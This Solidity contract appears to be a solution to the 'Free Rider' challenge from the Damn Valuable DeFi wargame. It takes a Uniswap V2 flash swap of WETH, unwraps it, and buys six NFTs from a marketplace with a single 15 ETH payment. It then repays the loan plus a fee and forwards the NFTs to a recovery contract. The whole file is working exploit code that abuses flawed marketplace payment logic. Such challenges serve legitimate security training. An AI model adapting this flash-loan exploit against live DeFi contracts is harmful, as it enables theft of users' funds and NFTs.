// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "solmate/src/tokens/WETH.sol";
import "../DamnValuableNFT.sol";

contract FreeRider is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public uPair;
    FreeRiderNFTMarketplace public nftMarketPlace;
    FreeRiderRecovery public recovery;
    WETH public weth;
    DamnValuableNFT public damnValuableNFT;

    address public player;
    uint public buyPrice = 15 ether;
    uint[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uPair,
        address payable _nftMarketPlace,
        address _recovery,
        address payable _weth,
        address _damnValuableNFT,
        address _player
    ) payable {
        uPair = IUniswapV2Pair(_uPair);
        nftMarketPlace = FreeRiderNFTMarketplace(_nftMarketPlace);
        recovery = FreeRiderRecovery(_recovery);
        weth = WETH(_weth);
        damnValuableNFT = DamnValuableNFT(_damnValuableNFT);
        player = _player;
    }

    function flashSwap() public {
        bytes memory data = abi.encode(buyPrice);
        uPair.swap(buyPrice, uint(0), address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        weth.withdraw(amount0);
        nftMarketPlace.buyMany{value: amount0}(tokenIds);
        uint amount0AddFee = (amount0 * 103) / 100;
        weth.deposit{value: amount0AddFee}();
        weth.transfer(msg.sender, amount0AddFee);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function transferNFT(uint id) public{
        bytes memory data = abi.encode(player);
        damnValuableNFT.safeTransferFrom(address(this), address(recovery), id, data);
    }
    receive() external payable {}
}
